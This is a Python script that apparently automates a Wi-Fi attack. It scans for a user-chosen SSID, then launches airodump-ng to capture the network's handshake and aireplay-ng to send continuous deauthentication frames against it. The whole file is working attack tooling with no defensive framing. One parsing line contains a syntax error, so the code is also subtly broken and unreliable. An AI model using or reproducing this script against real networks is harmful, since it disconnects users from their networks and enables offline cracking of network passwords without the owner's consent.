import subprocess
import time
import re

def get_interface():
    interface = input("Enter the network interface (e.g., wlan0, wlo1): ")
    return interface

def scan_wifi(interface):
    command = ['iwlist', interface, 'scan']
    try:
        return subprocess.check_output(command, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to scan networks: {e}")
        return None

def parse_wifi_data(scan_data, ssid):
    if scan_data:
        network_info = {}

        for line in scan_data.splitlines():
            if 'Cell' in line:  # Start of a new network block
                if network_info:  # If there's accumulated network info, check if it's the target
                    if network_info.get('ESSID') == ssid:
                        return network_info
                network_info = {}  # Reset for the next network

            if 'Address' in line:
                network_info['MAC Address'] = line.split(' ')[-1].strip()
            elif 'ESSID' in line:
                essid = line.split(':')[1].strip().strip('"')
                network_info['ESSID'] = essid
            elif 'Frequency' in line:
                match = re.search(r'(\d+\.\d+) GHz \(Channel (\d+)\)', line)
                if match:
                    network_info['Channel'] = match.group(2)
            elif 'Quality' in line or 'Signal level' in line:
                signal_strength = line.split('=')[1].split(' ')[0]
                network_info['Signal Strength'] = signal_strength
            elif 'Encryption key' in line:
                network_info['Security'] = 'Encrypted' if 'on' in line else 'Open'
            elif 'IE: IEEE' in line:
                if 'WPA' in line or 'WPA2' in line:
                    security_type = line.split(':')[1.strip()
                    network_info['Security'] = security_type

        # Check the last network entry
        if network_info.get('ESSID') == ssid:
            return network_info
        return None

def start_monitoring_tools(network_info, interface):
    channel = network_info['Channel']
    mac_address = network_info['MAC Address']
    
    # Attempt to find a suitable terminal emulator
    terminal = "xterm"  # Default to xterm for broader compatibility

    # Commands to run in new terminal windows
    airodump_cmd = f"{terminal} -e 'bash -c \"airodump-ng -c {channel} -w hash --bssid {mac_address} {interface}; sleep 30\"'"
    aireplay_cmd = f"{terminal} -e 'bash -c \"aireplay-ng -0 0 -a {mac_address} {interface}; sleep 30\"'"
    
    # Start the commands in separate terminals
    subprocess.Popen(airodump_cmd, shell=True)
    subprocess.Popen(aireplay_cmd, shell=True)

    # Allow commands to run for 30 seconds before closing terminals automatically
    time.sleep(35)  # Extra time to ensure that sleep commands inside terminals complete

def main():
    ssid_input = input("Enter the SSID you want to look up: ")
    interface = get_interface()

    while True:
        scan_data = scan_wifi(interface)
        if scan_data:
            network_info = parse_wifi_data(scan_data, ssid_input)
            if network_info:
                start_monitoring_tools(network_info, interface)
                break
        time.sleep(5)  # Scan every 5 seconds

if __name__ == "__main__":
    main()
